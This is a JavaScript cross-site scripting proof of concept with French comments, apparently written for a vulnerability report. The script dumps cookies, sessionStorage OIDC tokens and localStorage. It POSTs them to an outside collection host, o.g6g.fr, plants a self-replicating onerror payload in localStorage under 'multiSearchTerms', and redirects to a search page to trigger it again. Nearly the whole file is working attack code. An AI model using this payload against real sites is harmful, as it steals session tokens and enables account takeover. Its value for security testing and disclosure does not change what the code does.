(function () {
    'use strict';

    // ===================== CONFIG =====================
    var OOB = 'https://o.g6g.fr/' + document.domain; // Collaborator/OOB : reçoit le POST
    // ====================================================

    function dumpStore(s) {            // sérialise un Storage complet en objet {clé: valeur}
        var o = {};
        try { for (var i = 0; i < s.length; i++) { var k = s.key(i); o[k] = s.getItem(k); } } catch (e) {}
        return o;
    }

    // -------- 1) PoC visuel : ce fichier est SOUS TON CONTRÔLE → 'alert' n'est PAS filtré ici --------
    try { alert(`Voila la preuve d'exec JS sur ${document.domain}. SI la victime a un compte et une session active je peux recuperer l'oidc ici. \n Si la victime n'a pas encore de compte un attaquant peut polluer le localStorage pour provoquer une exec a chaque fois qu'il ira sur /recherche-tout-en-un \n Dans ce POC je vais vous rediriger directement sur /recherche-tout-en-un pour constater l'exec JS a partir de la valeur injectée dans le localStorage ici`); } catch (e) {}

    // -------- 2) Collecte : sessionStorage contient les tokens OIDC (oidc.user:* = id_token / access_token) --------
    var loot = {
        url:            location.href,
        domain:         document.domain,
        cookies:        document.cookie,        // non-HttpOnly seulement
        sessionStorage: dumpStore(sessionStorage),
        localStorage:   dumpStore(localStorage),
        ua:             navigator.userAgent,
        ts:             Date.now()
    };
    var body = JSON.stringify(loot);

    // -------- 3) Exfil vers OOB en POST : sendBeacon + fetch fallback --------
    try { navigator.sendBeacon(OOB, body); } catch (e) {}
    try {
        fetch(OOB, {
            method: 'POST',
            mode: 'no-cors',
            keepalive: true,
            headers: { 'Content-Type': 'text/plain' },
            body: body
        });
    } catch (e) {}

    // -------- 4) Pollution localStorage : payload autonome, dump inline dans le onerror, exfil direct vers OOB --------
    try {
        var msPayload = `"><img src=x onerror="(function(){function d(s){var o={};for(var i=0;i<s.length;i++){var k=s.key(i);o[k]=s.getItem(k)}return o}var dump={localStorage:d(localStorage),sessionStorage:d(sessionStorage),cookies:document.cookie,url:location.href,ts:Date.now()};fetch('${OOB}',{method:'POST',mode:'no-cors',body:JSON.stringify(dump)});alert('2eme_exec_js_ici_grace_au_local_storage_pollution sur '+document.domain)})()">`;
        localStorage.setItem('multiSearchTerms', JSON.stringify([msPayload]));
    } catch (e) {}

    // -------- 5) Navigation vers la page-sink pour que le rendu déclenche le payload seedé au load --------
    setTimeout(function () {
        try { location.assign('/recherche-tout-en-un'); }
        catch (e) { location.href = '/recherche-tout-en-un'; }
    }, 1200);
})();